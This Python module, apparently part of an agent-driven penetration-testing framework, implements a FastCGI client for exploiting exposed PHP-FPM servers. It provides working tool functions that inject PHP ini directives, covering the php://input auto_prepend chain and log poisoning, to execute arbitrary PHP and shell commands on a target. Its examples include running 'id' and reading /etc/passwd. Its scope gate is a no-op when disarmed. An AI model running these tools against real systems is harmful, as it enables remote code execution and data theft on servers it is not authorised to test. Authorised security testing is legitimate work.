"""Generic FastCGI client — direct PHP-FPM exploitation.

When PHP-FPM is network-exposed (port 9000), an attacker can connect
directly to the FastCGI server and inject PHP ini directives via the
``PHP_VALUE`` and ``PHP_ADMIN_VALUE`` FastCGI params.  This bypasses
the web server entirely — no HTTP layer, no Nginx/Apache in the path.

The classic RCE chain (no write primitive needed):

1. Set ``SCRIPT_FILENAME`` to a .php file that exists on the target
   (passes ``security.limit_extensions``).
2. Set ``PHP_ADMIN_VALUE: allow_url_include=1`` (PHP_INI_SYSTEM level).
3. Set ``PHP_VALUE: auto_prepend_file=php://input``.
4. Send PHP code in the request body (FCGI_STDIN).
5. PHP-FPM processes the request, prepends ``php://input`` (the body),
   and the PHP code executes as the FPM user.

Alternative chain (log poisoning, when ``allow_url_include`` is locked):

1. Poison a log file (e.g. Apache access log) with PHP code in the
   User-Agent via a prior HTTP request.
2. Set ``PHP_VALUE: auto_prepend_file=/var/log/apache2/access.log``.
3. Send an empty body — the prepended log file executes the PHP code.

This module implements the FastCGI binary protocol from scratch (no
external deps) and exposes two ``@framework_tool`` functions:

- ``fastcgi_request`` — low-level: arbitrary params, full control.
- ``fastcgi_php_exec`` — high-level: the ``php://input`` auto_prepend
  chain with a one-call interface for command execution.

References:
- https://www.reddit.com/r/netsec/comments/3d6xfq/remotely_exploiting_php_fpm/
- https://github.com/wofeiwo/webcgi-exploits/blob/master/php-fpm/fastcgi.exp
- MSF ``exploit/multi/http/php_fpm_rce`` (CVE-2019-11043, different attack)
"""

from __future__ import annotations

import json
import socket
import struct
import time
from typing import Any, Dict, List, Optional, Tuple

from constants import framework_tool

# --- FastCGI protocol constants ---------------------------------------------

FCGI_VERSION_1 = 1

FCGI_BEGIN_REQUEST = 1
FCGI_ABORT_REQUEST = 2
FCGI_END_REQUEST = 3
FCGI_PARAMS = 4
FCGI_STDIN = 5
FCGI_STDOUT = 7
FCGI_STDERR = 8

FCGI_RESPONDER = 1
FCGI_AUTHORIZER = 2
FCGI_FILTER = 3

FCGI_KEEP_CONN = 1  # keep connection open after request

FCGI_REQUEST_COMPLETE = 0
FCGI_CANT_MPX_CONN = 1
FCGI_OVERLOADED = 2
FCGI_UNKNOWN_ROLE = 3

FCGI_HEADER_LEN = 8
FCGI_MAX_CONTENT = 65535


# --- Low-level protocol helpers ---------------------------------------------

def _make_record(
    rec_type: int,
    request_id: int,
    content: bytes,
    version: int = FCGI_VERSION_1,
) -> bytes:
    """Build a single FastCGI record (header + content + padding)."""
    content_len = len(content)
    # Pad to 8-byte boundary (FastCGI spec: alignment for performance).
    padding_len = (8 - (content_len % 8)) % 8
    header = struct.pack(
        "!BBHHBx",
        version,
        rec_type,
        request_id,
        content_len,
        padding_len,
    )
    return header + content + b"\x00" * padding_len


def _begin_request(
    request_id: int,
    role: int = FCGI_RESPONDER,
    keep_conn: bool = False,
) -> bytes:
    """FCGI_BEGIN_REQUEST record."""
    flags = FCGI_KEEP_CONN if keep_conn else 0
    body = struct.pack("!HB5x", role, flags)
    return _make_record(FCGI_BEGIN_REQUEST, request_id, body)


def _encode_params(params: Dict[str, str]) -> bytes:
    """Encode key-value pairs into FastCGI FCGI_PARAMS content bytes."""
    chunks = bytearray()
    for key, value in params.items():
        key_b = str(key).encode("utf-8", errors="replace")
        val_b = str(value).encode("utf-8", errors="replace")
        chunks += _encode_length(len(key_b))
        chunks += _encode_length(len(val_b))
        chunks += key_b
        chunks += val_b
    return bytes(chunks)


def _encode_length(length: int) -> bytes:
    """Encode a name/value length per FastCGI spec.

    < 128: single byte (high bit 0).
    >= 128: four bytes (high bit 1 on first byte).
    """
    if length < 128:
        return struct.pack("!B", length)
    return struct.pack("!I", length | 0x80000000)


def _params_records(
    request_id: int,
    params: Dict[str, str],
) -> List[bytes]:
    """Split encoded params into FCGI_PARAMS records (max 65535 content each)."""
    encoded = _encode_params(params)
    records = []
    offset = 0
    while offset < len(encoded):
        chunk = encoded[offset : offset + FCGI_MAX_CONTENT]
        records.append(_make_record(FCGI_PARAMS, request_id, chunk))
        offset += len(chunk)
    # Empty FCGI_PARAMS record signals end of params.
    records.append(_make_record(FCGI_PARAMS, request_id, b""))
    return records


def _stdin_records(
    request_id: int,
    body: bytes = b"",
) -> List[bytes]:
    """Split body into FCGI_STDIN records + empty terminator."""
    records = []
    if body:
        offset = 0
        while offset < len(body):
            chunk = body[offset : offset + FCGI_MAX_CONTENT]
            records.append(_make_record(FCGI_STDIN, request_id, chunk))
            offset += len(chunk)
    # Empty FCGI_STDIN record signals end of stdin.
    records.append(_make_record(FCGI_STDIN, request_id, b""))
    return records


def _read_record(sock: socket.socket) -> Tuple[int, int, bytes]:
    """Read one FastCGI record from the socket.

    Returns (record_type, request_id, content_bytes). Returns
    (0, 0, b"") on EOF.
    """
    header = _recv_exact(sock, FCGI_HEADER_LEN)
    if not header:
        return (0, 0, b"")
    version, rec_type, req_id, content_len, padding_len = struct.unpack(
        "!BBHHBx", header
    )
    content = _recv_exact(sock, content_len) if content_len else b""
    if padding_len:
        _recv_exact(sock, padding_len)
    return (rec_type, req_id, content)


def _recv_exact(sock: socket.socket, length: int) -> bytes:
    """Read exactly ``length`` bytes from the socket, or return less on EOF."""
    data = bytearray()
    while len(data) < length:
        chunk = sock.recv(length - len(data))
        if not chunk:
            break
        data += chunk
    return bytes(data)


# --- Core FastCGI client -----------------------------------------------------

def _fastcgi_send(
    host: str,
    port: int,
    params: Dict[str, str],
    body: bytes = b"",
    timeout: float = 10.0,
    keep_conn: bool = False,
) -> Dict[str, Any]:
    """Open a TCP connection to a FastCGI server, send a request, read response.

    Returns a dict with ``stdout``, ``stderr``, ``app_status``, and
    ``elapsed``. Raises ``ConnectionError`` if the server is unreachable.
    """
    request_id = 1
    t0 = time.monotonic()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))

        # Send: BEGIN_REQUEST + PARAMS + STDIN
        wire = _begin_request(request_id, keep_conn=keep_conn)
        for rec in _params_records(request_id, params):
            wire += rec
        for rec in _stdin_records(request_id, body):
            wire += rec
        sock.sendall(wire)

        # Read response: collect STDOUT + STDERR until END_REQUEST
        stdout_chunks: List[bytes] = []
        stderr_chunks: List[bytes] = []
        app_status = None

        while True:
            rec_type, req_id, content = _read_record(sock)
            if rec_type == 0:
                break  # EOF
            if rec_type == FCGI_STDOUT and req_id == request_id:
                stdout_chunks.append(content)
            elif rec_type == FCGI_STDERR and req_id == request_id:
                stderr_chunks.append(content)
            elif rec_type == FCGI_END_REQUEST and req_id == request_id:
                if len(content) >= 4:
                    app_status = struct.unpack("!I", content[:4])[0]
                break

        elapsed = round(time.monotonic() - t0, 3)
        return {
            "stdout": b"".join(stdout_chunks).decode("utf-8", errors="replace"),
            "stderr": b"".join(stderr_chunks).decode("utf-8", errors="replace"),
            "app_status": app_status,
            "elapsed": elapsed,
        }
    finally:
        sock.close()


# --- Default FastCGI params --------------------------------------------------

def _default_params(
    script_filename: str,
    method: str = "GET",
    query_string: str = "",
    server_name: str = "localhost",
    server_addr: str = "",
    server_port: str = "80",
    remote_addr: str = "127.0.0.1",
    content_type: str = "",
    content_length: str = "",
) -> Dict[str, str]:
    """Build the standard FastCGI params that PHP-FPM expects."""
    params = {
        "SCRIPT_FILENAME": script_filename,
        "SCRIPT_NAME": "/" + script_filename.rsplit("/", 1)[-1],
        "REQUEST_METHOD": method,
        "QUERY_STRING": query_string,
        "SERVER_NAME": server_name,
        "SERVER_ADDR": server_addr or "127.0.0.1",
        "SERVER_PORT": server_port,
        "REMOTE_ADDR": remote_addr,
        "GATEWAY_INTERFACE": "CGI/1.1",
        "SERVER_PROTOCOL": "HTTP/1.1",
        "DOCUMENT_ROOT": "/" + "/".join(script_filename.split("/")[:-1]),
        "REQUEST_URI": "/" + script_filename.rsplit("/", 1)[-1]
        + (f"?{query_string}" if query_string else ""),
    }
    if content_type:
        params["CONTENT_TYPE"] = content_type
    if content_length:
        params["CONTENT_LENGTH"] = content_length
    return params


# --- @framework_tool wrappers ------------------------------------------------

@framework_tool(
    "Send a raw FastCGI request to a PHP-FPM or FastCGI server with full "
    "control over params (SCRIPT_FILENAME, PHP_VALUE, PHP_ADMIN_VALUE, etc.). "
    "Use this when you need custom PHP ini injection or non-standard FastCGI "
    "params. For simple command execution via PHP-FPM, use fastcgi_php_exec "
    "instead. Returns stdout, stderr, app_status, and elapsed time.",
    next_hints=["report_finding"],
)
def fastcgi_request(
    target: str,
    port: int = 9000,
    script_filename: str = "/var/www/html/index.php",
    php_value: str = "",
    php_admin_value: str = "",
    method: str = "GET",
    query_string: str = "",
    server_name: str = "localhost",
    body: str = "",
    extra_params: str = "",
    timeout: float = 10.0,
) -> Dict[str, Any]:
    """Send a raw FastCGI request to a PHP-FPM/FastCGI server.

    Connects directly to the FastCGI server (no HTTP layer) and sends
    arbitrary params, including PHP ini directives via ``PHP_VALUE`` and
    ``PHP_ADMIN_VALUE``. This is the primitive for PHP-FPM exploitation
    when the FastCGI port is exposed.

    Common attack chains:
    - **php://input**: Set ``php_admin_value=allow_url_include=1`` and
      ``php_value=auto_prepend_file=php://input``, send PHP code in
      ``body`` (use ``fastcgi_php_exec`` for this).
    - **Log poisoning**: Poison a log via HTTP (User-Agent), then set
      ``php_value=auto_prepend_file=/var/log/apache2/access.log``.
    - **Session poisoning**: Set ``php_value=session.upload_progress.cleanup=off``
      + race condition (advanced).

    Args:
        target: IP address of the FastCGI server (e.g. ``192.168.190.205``).
        port: FastCGI TCP port (default 9000).
        script_filename: Absolute path to a PHP file on the target that
            passes ``security.limit_extensions`` (must end in ``.php``).
            The file must exist but doesn't need to contain meaningful code.
        php_value: PHP_VALUE ini directives (PHP_INI_USER level), semicolon-
            separated (e.g. ``auto_prepend_file=php://input``).
        php_admin_value: PHP_ADMIN_VALUE ini directives (PHP_INI_SYSTEM
            level, e.g. ``allow_url_include=1``).
        method: HTTP method (default GET). Use POST when sending a body.
        query_string: URL query string (e.g. ``cmd=id``).
        server_name: SERVER_NAME param (default localhost). Set to the
            target's hostname for vhost-gated apps.
        body: Request body (sent as FCGI_STDIN). Used for php://input
            injection.
        extra_params: JSON string of additional FastCGI params to merge
            (e.g. ``{"HTTP_HOST": "target.local"}``).
        timeout: Socket timeout in seconds (default 10).
    """
    # Scope gate (operator-armed from the Tool REPL; no-op when disarmed).
    # Raw FastCGI param injection is RCE-grade traffic — honour the gate
    # (2026-09-19 gap: was ungated).
    from utils.scope_gate import check_scan, ScopeGateError
    _sc_ok, _sc_reason = check_scan(target)
    if not _sc_ok:
        raise ScopeGateError(f"scope gate: {_sc_reason}")

    params = _default_params(
        script_filename=script_filename,
        method=method,
        query_string=query_string,
        server_name=server_name,
        content_type="application/x-www-form-urlencoded" if body else "",
        content_length=str(len(body.encode())) if body else "",
    )

    if php_value:
        params["PHP_VALUE"] = php_value
    if php_admin_value:
        params["PHP_ADMIN_VALUE"] = php_admin_value

    if extra_params:
        try:
            extra = json.loads(extra_params)
            if isinstance(extra, dict):
                params.update({str(k): str(v) for k, v in extra.items()})
        except (json.JSONDecodeError, TypeError):
            pass  # best-effort; ignore malformed JSON

    body_bytes = body.encode("utf-8", errors="replace") if body else b""

    try:
        result = _fastcgi_send(target, port, params, body=body_bytes, timeout=timeout)
    except (socket.timeout, ConnectionRefusedError, OSError) as e:
        return {
            "error": f"FastCGI connection to {target}:{port} failed: {e}",
            "status": "Failed",
        }

    # Check if the response looks like a PHP error (no real output).
    stdout = result["stdout"]
    if stdout.startswith("Status: 40") or "Access denied" in stdout:
        result["note"] = "Server returned an error — check script_filename and PHP settings"

    return result


@framework_tool(
    "Execute arbitrary PHP code on a target via an exposed PHP-FPM FastCGI "
    "port. Uses the auto_prepend_file=php://input technique: sets "
    "allow_url_include=1 via PHP_ADMIN_VALUE, auto_prepend_file=php://input "
    "via PHP_VALUE, and sends the PHP code in the request body. No write "
    "primitive needed — the PHP code executes as the FPM user. Returns the "
    "raw output from the executed code.",
    next_hints=["report_finding", "fastcgi_request"],
)
def fastcgi_php_exec(
    target: str,
    port: int = 9000,
    php_code: str = "<?php echo shell_exec('id'); ?>",
    script_filename: str = "/var/www/html/index.php",
    server_name: str = "localhost",
    timeout: float = 10.0,
) -> Dict[str, Any]:
    """Execute PHP code on a target via PHP-FPM FastCGI exploitation.

    Implements the ``auto_prepend_file=php://input`` RCE chain:
    1. Connects to the FastCGI server on ``target:port``.
    2. Sets ``PHP_ADMIN_VALUE: allow_url_include=1``.
    3. Sets ``PHP_VALUE: auto_prepend_file=php://input``.
    4. Sends ``php_code`` as the request body (FCGI_STDIN).
    5. PHP-FPM prepends ``php://input`` (the body) before executing
       ``script_filename``, running the injected PHP code.

    Requirements on the target:
    - PHP-FPM FastCGI port is network-reachable (default 9000).
    - ``script_filename`` must exist and end in ``.php`` (passes
      ``security.limit_extensions``).
    - ``allow_url_include`` must be settable via ``PHP_ADMIN_VALUE``
      (default in most PHP-FPM configs).

    If ``allow_url_include`` is locked down, use ``fastcgi_request``
    with the log-poisoning chain instead (``auto_prepend_file=/var/log/...``).

    Args:
        target: IP address of the FastCGI server (e.g. ``192.168.190.205``).
        port: FastCGI TCP port (default 9000).
        php_code: PHP code to execute (e.g.
            ``<?php system('cat /etc/passwd'); ?>``).
        script_filename: Absolute path to an existing .php file on the
            target (default ``/var/www/html/index.php``).
        server_name: SERVER_NAME param (default localhost).
        timeout: Socket timeout in seconds (default 10).
    """
    # Scope gate (operator-armed from the Tool REPL; no-op when disarmed).
    # The php://input chain is arbitrary code execution — honour the gate
    # (2026-09-19 gap: was ungated).
    from utils.scope_gate import check_scan, ScopeGateError
    _sc_ok, _sc_reason = check_scan(target)
    if not _sc_ok:
        raise ScopeGateError(f"scope gate: {_sc_reason}")

    # Ensure the PHP code has opening/closing tags.
    code = php_code.strip()
    if not code.startswith("<?"):
        code = "<?php " + code
    if not code.endswith("?>"):
        code = code + " ?>"

    body = code.encode("utf-8", errors="replace")

    params = _default_params(
        script_filename=script_filename,
        method="POST",
        server_name=server_name,
        content_type="application/x-www-form-urlencoded",
        content_length=str(len(body)),
    )
    params["PHP_ADMIN_VALUE"] = "allow_url_include=1"
    params["PHP_VALUE"] = "auto_prepend_file=php://input"

    try:
        result = _fastcgi_send(target, port, params, body=body, timeout=timeout)
    except (socket.timeout, ConnectionRefusedError, OSError) as e:
        return {
            "error": f"FastCGI connection to {target}:{port} failed: {e}",
            "status": "Failed",
        }

    stdout = result["stdout"]

    # PHP-FPM returns headers (Content-Type, etc.) followed by the body.
    # Strip the headers to isolate the command output.
    if "\r\n\r\n" in stdout:
        header_block, _, response_body = stdout.partition("\r\n\r\n")
        result["response_body"] = response_body
        # Extract status from the header.
        for line in header_block.split("\r\n"):
            if line.lower().startswith("status:"):
                result["http_status"] = line.split(":", 1)[1].strip()
    elif "\n\n" in stdout:
        _, _, response_body = stdout.partition("\n\n")
        result["response_body"] = response_body
    else:
        result["response_body"] = stdout

    # Detect common failure modes.
    if "Warning: include()" in stdout or "failed to open stream" in stdout:
        result["note"] = (
            "auto_prepend_file failed — allow_url_include may be locked. "
            "Try fastcgi_request with the log-poisoning chain instead."
        )
    elif result.get("http_status", "").startswith("40"):
        result["note"] = "Server returned 40x — script_filename may not exist"

    return result
